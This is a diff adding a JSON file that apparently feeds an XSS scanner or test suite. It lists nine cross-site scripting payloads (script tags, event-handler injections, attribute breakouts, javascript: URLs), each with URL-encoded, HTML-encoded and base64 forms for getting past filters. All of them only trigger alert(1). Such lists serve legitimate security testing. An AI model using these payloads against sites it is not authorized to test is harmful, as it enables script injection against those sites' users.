@@ -1,0 +1,68 @@
+{
+  "type": "xss",
+  "payloads": [
+    {
+      "payload": "<script>alert(1)</script>",
+      "url_encoded": "%3Cscript%3Ealert%281%29%3C/script%3E",
+      "html_encoded": "&lt;script&gt;alert(1)&lt;/script&gt;",
+      "base64": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+      "context": "html"
+    },
+    {
+      "payload": "<img src=x onerror=alert(1)>",
+      "url_encoded": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+      "html_encoded": "&lt;img src=x onerror=alert(1)&gt;",
+      "base64": "PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==",
+      "context": "html"
+    },
+    {
+      "payload": "<svg onload=alert(1)>",
+      "url_encoded": "%3Csvg%20onload%3Dalert%281%29%3E",
+      "html_encoded": "&lt;svg onload=alert(1)&gt;",
+      "base64": "PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+",
+      "context": "html"
+    },
+    {
+      "payload": "\"><script>alert(1)</script>",
+      "url_encoded": "%22%3E%3Cscript%3Ealert%281%29%3C/script%3E",
+      "html_encoded": "&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
+      "base64": "Ij48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+",
+      "context": "html"
+    },
+    {
+      "payload": "'><img src=x onerror=alert(1)>",
+      "url_encoded": "%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+      "html_encoded": "&#x27;&gt;&lt;img src=x onerror=alert(1)&gt;",
+      "base64": "Jz48aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSk+",
+      "context": "html"
+    },
+    {
+      "payload": "<details open ontoggle=alert(1)>",
+      "url_encoded": "%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E",
+      "html_encoded": "&lt;details open ontoggle=alert(1)&gt;",
+      "base64": "PGRldGFpbHMgb3BlbiBvbnRvZ2dsZT1hbGVydCgxKT4=",
+      "context": "html"
+    },
+    {
+      "payload": "<input autofocus onfocus=alert(1)>",
+      "url_encoded": "%3Cinput%20autofocus%20onfocus%3Dalert%281%29%3E",
+      "html_encoded": "&lt;input autofocus onfocus=alert(1)&gt;",
+      "base64": "PGlucHV0IGF1dG9mb2N1cyBvbmZvY3VzPWFsZXJ0KDEpPg==",
+      "context": "html"
+    },
+    {
+      "payload": "javascript:alert(1)",
+      "url_encoded": "javascript%3Aalert%281%29",
+      "html_encoded": "javascript:alert(1)",
+      "base64": "amF2YXNjcmlwdDphbGVydCgxKQ==",
+      "context": "html"
+    },
+    {
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "url_encoded": "%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E",
+      "html_encoded": "&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;",
+      "base64": "PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiPg==",
+      "context": "html"
+    }
+  ]
+}
